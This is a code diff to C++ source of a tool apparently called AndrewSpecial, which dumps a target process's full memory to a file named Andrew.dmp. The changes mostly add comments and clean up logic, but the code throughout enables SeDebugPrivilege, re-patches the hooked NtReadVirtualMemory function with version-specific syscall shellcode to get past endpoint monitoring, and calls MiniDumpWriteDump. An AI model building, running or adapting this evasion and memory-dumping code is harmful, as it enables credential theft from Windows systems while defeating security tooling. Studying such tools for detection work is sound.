@@ -81,27 +81,19 @@ BYTE GetNtReadVirtualMemorySyscall()
 
 	auto version_long = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;
 
-	if (version_long < win8)
+	if (version_long < win8) //before win8
 	{
 		syscall_id = 0x3c;
 	}
-	else if (version_long)
+	else if (version_long == win8) //win8 and server 2008 sp0
 	{
 		syscall_id = 0x3d;
 	}
-	else if (version_long)
+	else if (version_long == win81) //win 8.1 and server 2008 r2
 	{
 		syscall_id = 0x3e;
 	}
-	else if (version_long == win8)
-	{
-		syscall_id = 0x3d;
-	}
-	else if (version_long == win81)
-	{
-		syscall_id = 0x3e;
-	}
-	else if (version_long > win81)
+	else if (version_long > win81) //anything after win8.1
 	{
 		syscall_id = 0x3f;
 	}
@@ -113,9 +105,10 @@ BYTE GetNtReadVirtualMemorySyscall()
 
 void Free_NtReadVirtualMemory()
 {
-	BYTE syscall = GetNtReadVirtualMemorySyscall();
+	BYTE syscall = GetNtReadVirtualMemorySyscall(); //Get the syscall id for NtRVM for your particular os
 
 	printf("ntReadVirtualMemory Syscall is %x\n", syscall);
+
 #ifdef  _WIN64
 	BYTE Shellcode[] =
 	{
@@ -144,17 +137,19 @@ void Free_NtReadVirtualMemory()
 
 bool AndrewSpecial(const wchar_t * ProcessName)
 {
-	SetPrivilege(L"SeDebugPrivilege", TRUE);
+	SetPrivilege(L"SeDebugPrivilege", TRUE); //set SeDebugPrivilege
+
 	auto pid = GetProcId(ProcessName);
+
 	auto hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
 	if(hProc)
 	{
-		printf("RPM: %p ---- ntRVM: %p\n", ReadProcessMemory, NtReadVirtualMemory);
-		printf("Decoupling Stage 1 Rockets, Retrograde burn starting...\n");
-		Free_NtReadVirtualMemory();
+		printf("RPM: %p ---- ntRVM: %p\n", ReadProcessMemory, NtReadVirtualMemory); //Tell me you where the functions are in memory
 
-		HANDLE hFile = CreateFileA("Andrew.dmp", GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+		Free_NtReadVirtualMemory(); //Repatch the jmp
+
+		HANDLE hFile = CreateFileA("Andrew.dmp", GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr); //Create the dmp file
 
 		if (!hFile)
 		{
@@ -164,9 +159,9 @@ bool AndrewSpecial(const wchar_t * ProcessName)
 		{
 			if (hProc)
 			{
-				printf("Got %S handle %x\n", ProcessName, hProc);
+				printf("Got %S handle: %x\n", ProcessName, hProc);
 
-				BOOL Result = MiniDumpWriteDump(hProc,
+				BOOL Result = MiniDumpWriteDump(hProc, //does the dump
 					pid,
 					hFile,
 					MiniDumpWithFullMemory,
@@ -182,7 +177,8 @@ bool AndrewSpecial(const wchar_t * ProcessName)
 				}
 				else
 				{
-					printf("Successfully launched the AndrewSpecial. Mission Successful!\n");
+					printf("Successfully launched the AndrewSpecial. Looks for Andrew.dmp\n");
+					return 0;
 				}
 			}
 			else
@@ -190,8 +186,6 @@ bool AndrewSpecial(const wchar_t * ProcessName)
 				printf("OpenProcess Failed.\n");
 			}
 		}
-
-		return 0;
 	}
 	else
 	{
@@ -199,4 +193,3 @@ bool AndrewSpecial(const wchar_t * ProcessName)
 	}
 	return 1;
 }
-
